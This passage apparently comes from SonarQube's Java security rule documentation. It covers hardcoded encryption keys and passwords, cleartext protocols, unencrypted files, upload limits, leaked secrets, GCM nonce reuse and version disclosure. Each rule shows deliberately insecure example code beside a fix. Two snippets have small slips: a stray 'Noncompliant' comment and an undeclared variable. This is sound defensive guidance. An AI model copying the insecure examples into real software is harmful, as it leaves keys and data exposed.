<p>By not protecting the encryption key properly, it becomes very easy for an attacker to recover it and then decrypt the mobile database. At that
point, the theft of sensitive data might lead to identity theft, financial fraud, and other forms of malicious activities.</p>
<h2>How to fix it in Realm</h2>
<h3>Code examples</h3>
<p>In the example below, a local database is opened using a hardcoded key. To fix this, the key is moved to a secure location instead and retrieved
using a <code>getKey()</code> method.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="201" data-diff-type="noncompliant">
String key = "gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g";
RealmConfiguration config = new RealmConfiguration.Builder();
    .encryptionKey(key.toByteArray()) // Noncompliant
    .build();
Realm realm = Realm.getInstance(config);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="201" data-diff-type="compliant">
RealmConfiguration config = new RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build();
Realm realm = Realm.getInstance(config);
</pre>
<h3>How does this work?</h3>
<h4>Using Android’s builtin key storage options</h4>
<p>The <a href="https://developer.android.com/privacy-and-security/keystore">Android Keystore</a> system allows apps to store encryption keys in a
container that is protected on a system level. Additionally, it can restrict when and how the keys are used. For example, it allows the app to require
user authentication (for example using a fingerprint) before the key is made available. This is the recommended way to store cryptographic keys on
Android.</p>
<h4>Dynamically retrieving encryption keys remotely</h4>
<p>As user devices are less trusted than controlled environments such as the application backend, the latter should be preferred for the storage of
encryption keys. This requires that a user’s device has an internet connection, which may not be suitable for every use case.</p>
<h3>Going the extra mile</h3>
<h4>Avoid storing sensitive data on user devices</h4>
<p>In general, it is always preferable to store as little sensitive data on user devices as possible.</p>
<p>Of course, some sensitive data always has to be stored on client devices, such as the data required for authentication. In this case, consider
whether the application logic can also function with a hash (or otherwise non-reversible form) of that data. For example, if an email address is
required for authentication, it might be possible to use and store a hashed version of this address instead.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Android Documentation - <a href="https://developer.android.com/privacy-and-security/keystore">Android Keystore system</a> </li>
  <li> Android Documentation - <a href="https://developer.android.com/privacy-and-security/security-tips#UserData">Security tips - User data</a> </li>
  <li> OWASP Mobile Application Security Testing Guide - <a
  href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05d-testing-data-storage">Data Storage on Android</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard - Data Storage and Privacy Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">Mobile Top 10 2016 Category M2 - Insecure
  Data Storage</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/321">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2068">
              java:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, passwords should not be hard-coded. This is particularly true for
applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Passwords should be stored outside of the code in a configuration file, a database, or a password management service.</p>
<p>This rule flags instances of hard-coded passwords used in database and LDAP connections. It looks for hard-coded passwords in connection strings,
and for variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The password allows access to a sensitive component like a database, a file storage, an API, or a service. </li>
  <li> The password is used in production environments. </li>
  <li> Application re-distribution is required before updating the password. </li>
</ul>
<p>There would be a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
String username = "steve";
String password = "blue";
Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
                  "user=" + username + "&amp;password=" + password); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
String username = getEncryptedUser();
String password = getEncryptedPassword();
Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
                  "user=" + username + "&amp;password=" + password);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5332">
              java:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>These clients from <a href="https://commons.apache.org/proper/commons-net/">Apache commons net</a> libraries are based on unencrypted protocols and
are not recommended:</p>
<pre>
TelnetClient telnet = new TelnetClient(); // Sensitive

FTPClient ftpClient = new FTPClient(); // Sensitive

SMTPClient smtpClient = new SMTPClient(); // Sensitive
</pre>
<p>Unencrypted HTTP connections, when using <a href="https://square.github.io/okhttp/https/">okhttp</a> library for instance, should be avoided:</p>
<pre>
ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive
  .build();
</pre>
<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed
content):</p>
<pre>
import android.webkit.WebView

WebView webView = findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use instead these clients from <a href="https://commons.apache.org/proper/commons-net/">Apache commons net</a> and <a
href="http://www.jcraft.com/jsch/">JSch/ssh</a> library:</p>
<pre>
JSch jsch = new JSch();

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  FTPSClient ftpsClient = new FTPSClient(true);
}
else {
  FTPSClient ftpsClient = new FTPSClient();
}

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  SMTPSClient smtpsClient = new SMTPSClient(true);
}
else {
  SMTPSClient smtpsClient = new SMTPSClient();
  smtpsClient.connect("127.0.0.1", 25);
  if (smtpsClient.execTLS()) {
    // commands
  }
}
</pre>
<p>Perform HTTP encrypted connections, with <a href="https://square.github.io/okhttp/https/">okhttp</a> library for instance:</p>
<pre>
ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
  .build();
</pre>
<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>
<pre>
import android.webkit.WebView

WebView webView = findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6300">
              java:S6300
            </a>
          </td>
          <td>
            <details>
              <p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with
physical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file contains sensitive data that could cause harm when leaked. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local files that contain sensitive information. The class <a
href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile">EncryptedFile</a> can be used to easily encrypt files.</p>
<h2>Sensitive Code Example</h2>
<pre>
Files.write(path, content); // Sensitive

FileOutputStream out = new FileOutputStream(file); // Sensitive

FileWriter fw = new FileWriter("outfilename", false); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
String masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);

File file = new File(context.getFilesDir(), "secret_data");
EncryptedFile encryptedFile = EncryptedFile.Builder(
    file,
    context,
    masterKeyAlias,
    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB
).build();

// write to the encrypted file
FileOutputStream encryptedOutputStream = encryptedFile.openFileOutput();
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard - Data Storage and Privacy Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">Mobile Top 10 2016 Category M2 - Insecure
  Data Storage</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5693">
              java:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevent DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul>  </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p>With default limit value of 8388608 (8MB).</p>
<p>A 100 MB file is allowed to be uploaded:</p>
<pre>
@Bean(name = "multipartResolver")
public CommonsMultipartResolver multipartResolver() {
  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver();
  multipartResolver.setMaxUploadSize(104857600); // Sensitive (100MB)
  return multipartResolver;
}

@Bean(name = "multipartResolver")
public CommonsMultipartResolver multipartResolver() {
  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver(); // Sensitive, by default if maxUploadSize property is not defined, there is no limit and thus it's insecure
  return multipartResolver;
}

@Bean
public MultipartConfigElement multipartConfigElement() {
  MultipartConfigFactory factory = new MultipartConfigFactory(); // Sensitive, no limit by default
  return factory.createMultipartConfig();
}
</pre>
<h2>Compliant Solution</h2>
<p>File upload size is limited to 8 MB:</p>
<pre>
@Bean(name = "multipartResolver")
public CommonsMultipartResolver multipartResolver() {
  multipartResolver.setMaxUploadSize(8388608); // Compliant (8 MB)
  return multipartResolver;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6437">
              java:S6437
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import org.h2.security.SHA256;

String inputString = "s3cr37";
byte[] key         = inputString.getBytes();

SHA256.getHMAC(key, message);  // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import org.h2.security.SHA256;

String inputString = System.getenv("SECRET");
byte[] key         = inputString.getBytes();

SHA256.getHMAC(key, message);  // Noncompliant
</pre>
<h3>How does this work?</h3>
<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secret’s value from its environment. This
allows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>
<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html">What is AWS Secrets Manager</a> </li>
  <li> Azure Documentation - <a href="https://learn.microsoft.com/en-us/azure/key-vault/">Azure Key Vault</a> </li>
  <li> Google Cloud - <a href="https://cloud.google.com/secret-manager/docs">Secret Manager documentation</a> </li>
  <li> HashiCorp Developer - <a href="https://developer.hashicorp.com/vault/docs">Vault Documentation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 - Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 - Category A2 - Broken
  Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6432">
              java:S6432
            </a>
          </td>
          <td>
            <details>
              <p>When encrypting data using AES-GCM or AES-CCM, it is essential not to reuse the same initialization vector (IV, also called nonce) with a given
key. To prevent this, it is recommended to either randomize the IV for each encryption or increment the IV after each encryption.</p>
<h2>Why is this an issue?</h2>
<p>When encrypting data using a counter (CTR) derived block cipher mode of operation, it is essential not to reuse the same initialization vector (IV)
for a given key. An IV that complies with this requirement is called a "nonce" (<strong>n</strong>umber used <strong>once</strong>). Galois/Counter
(GCM) and Counter with Cipher Block Chaining-Message Authentication Code (CCM) are both derived from counter mode.</p>
<p>When using AES-GCM or AES-CCM, a given key and IV pair will create a "keystream" that is used to encrypt a plaintext (original content) into a
ciphertext (encrypted content.) For any key and IV pair, this keystream is always deterministic. Because of this property, encrypting several
plaintexts with one key and IV pair can be catastrophic. If an attacker has access to one plaintext and its associated ciphertext, they are able to
decrypt everything that was created using the same pair.</p>
<p>Additionally, IV reuse also drastically decreases the key recovery computational complexity by downgrading it to a simpler polynomial root-finding
problem. This means that even without access to a plaintext/ciphertext pair, an attacker may still be able to decrypt all the sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>If the encryption that is being used is flawed, attackers might be able to exploit it in several ways. They might be able to decrypt existing
sensitive data or bypass key protections.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By not using the encryption algorithm correctly, the likelihood that an attacker might be able to recover the original sensitive data drastically
increases.</p>
<h4>Additional attack surface</h4>
<p>Encrypted values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them. If an
attacker is able to modify the cleartext of the encrypted message, it might be possible to trigger other vulnerabilities in the code.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<p>The example uses a hardcoded IV as a nonce, which causes AES-CCM to be insecure. To fix it, a nonce is randomly generated instead.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="101" data-diff-type="noncompliant">
public void encrypt(byte[] key, byte[] ptxt) {
    byte[] nonce = "7cVgr5cbdCZV".getBytes("UTF-8");

    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);

    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="101" data-diff-type="compliant">
public void encrypt(byte[] key, byte[] ptxt) {
    SecureRandom random = new SecureRandom();
    byte[] nonce = new byte[12];
    random.nextBytes(nonce);

    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);

    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);
}
</pre>
<h3>How does this work?</h3>
<p>For AES-GCM and AES-CCM, NIST recommends generating a nonce using either a deterministic approach or using a 'Random Bit Generator (RBG)'.</p>
<h4>Generating nonces using random number generation</h4>
<p>When using a randomized approach, NIST recommends a nonce of at least 96 bits using a cryptographically secure pseudorandom number generator
(CSPRNG.) Such a generator can create output with a sufficiently low probability of the same number being output twice (also called a
<em>collision</em>) for a long time. However, after 2<sup>32</sup> generated numbers for the same key, NIST recommends rotating this key for a new
one. After that amount of generated numbers, the probability of a collision is high enough to be considered insecure.</p>
<p>The code example above demonstrates how CSPRNGs can be used to generate nonces.</p>
<p>Be careful to use a random number generator that is sufficiently secure. Default (non-cryptographically secure) RNGs might be more prone to
collisions in their output, which is catastrophic for counter-based encryption modes.</p>
<h4>Deterministically generating nonces</h4>
<p>One method to prevent the same IV from being used multiple times for the same key is to update the IV in a deterministic way after each encryption.
The most straightforward deterministic method for this is a counter.</p>
<p>The way this works is simple: for any key, the first IV is the number zero. After this IV is used to encrypt something with a key, it is
incremented for that key (and is now equal to 1). Although this requires additional bookkeeping, it should guarantee that for each encryption key, an
IV is never repeated.</p>
<p>For a secure implementation, NIST suggests generating these nonces in two parts: a fixed field and an invocation field. The fixed field should be
used to identify the device executing the encryption (for example, it could contain a device ID), such that for one key, no two devices can generate
the same nonce. The invocation field contains the counter as described above. For a 96-bit nonce, NIST recommends (but does not require) using a
32-bit fixed field and a 64-bit invocation field. Additional details can be found in the <a
href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf">NIST Special Publication 800-38D</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/323">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf">NIST, SP-800-38C</a> - Recommendation for Block Cipher
  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf">NIST, SP-800-38D</a> - Recommendation for Block Cipher
  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5689">
              java:S5689
            </a>
          </td>
          <td>
            <details>
              <p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a
significant security risk depending on the production environement.</p>
<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>
<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit
known vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those
vulnerabilities.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Version information is accessible to end users. </li>
  <li> Internal systems do not benefit from timely patch management workflows. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying
architectures. This is known as the "need to know" principle.</p>
<p>The most effective solution is to remove version information disclosure from what end users can see, such as the "x-powered-by" header.<br> This
can be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>
<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that
this does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should
